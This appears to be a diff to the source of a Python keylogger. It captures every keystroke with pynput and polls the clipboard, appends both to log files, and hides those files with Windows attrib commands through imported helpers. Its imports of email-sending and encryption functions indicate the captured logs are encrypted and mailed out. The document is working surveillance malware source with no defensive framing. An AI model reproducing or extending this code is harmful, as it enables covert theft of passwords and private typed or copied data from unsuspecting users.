@@ -1,3 +1,4 @@
+import atexit
 import os
 import threading
 import time
@@ -6,7 +7,7 @@ from pynput import keyboard
 import pyperclip
 from threading import Thread
 import ctypes
-from emailFunctionality import sendEmail
+from emailFunctionality import sendEmail, hide, unhide, remove
 from encryption import encryptContents 
 
 ThreadRunning = True
@@ -16,40 +17,26 @@ ThreadRunning = True
 log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
 
-# def unhide():
-#     if os.path.exists(log_file):
-#         os.system(f'attrib -h "{log_file}"')
 
-#     if os.path.exists(clipBoard_file):
-#         os.system(f'attrib -h "{clipBoard_file}"')
-
-# def hide():
-#     if os.path.exists(log_file):
-#         os.system(f'attrib +h "{log_file}"')
-
-#     if os.path.exists(clipBoard_file):
-#         os.system(f'attrib +h "{clipBoard_file}"')
-
-
-# unhide()
 with open(log_file, "w") and open(clipBoard_file, "w"):
     pass
-# hide()
-
 
 def on_press(key):
     global ThreadRunning
     if key == keyboard.Key.esc:
         print("escape")
         ThreadRunning = False
+        unhide()
+        remove()
+        atexit.register(remove)
         return False  
     
     keyPressed = returnKeyType(key)
-    # with file_lock:
-    #     unhide()
+
+    unhide()
     with open(log_file, "a") as keyLogs:
         keyLogs.write(parseOutput(keyPressed))
-    # hide()
+    hide()
 
 def returnKeyType(key):
     try:
@@ -72,13 +59,11 @@ def checkClipBoard():
         currContent = pyperclip.paste()
         if currContent != prevContent:
             prevContent = currContent
-            # with file_lock:
-            #     unhide()
 
+            unhide()
             with open(clipBoard_file, "a") as clipBoardKeyLogs:
-                clipBoardKeyLogs.write(parseOutput(prevContent))
-
-                # hide()
+               clipBoardKeyLogs.write(parseOutput(prevContent))
+            hide()
         time.sleep(1)
     
 
@@ -110,18 +95,8 @@ if __name__ == "__main__":
         listener.start() 
         listener.join()
 
-        if os.path.exists("logs.txt"):
-            os.system(f'attrib -h "{"logs.txt"}"')
-            os.remove("logs.txt")
-        if os.path.exists("clipBoardLogs.txt"):
-            os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
-            os.remove("clipBoardLogs.txt")
-        if os.path.exists("logs.bin"):
-            os.system(f'attrib -h "{"logs.bin"}"')
-            os.remove("logs.bin")
-        if os.path.exists("clipBoardLogs.bin"):
-            os.system(f'attrib -h "{"clipBoardLogs.bin"}"')
-            os.remove("clipBoardLogs.bin")
+
+
   
     except KeyboardInterrupt:
         ThreadRunning = False
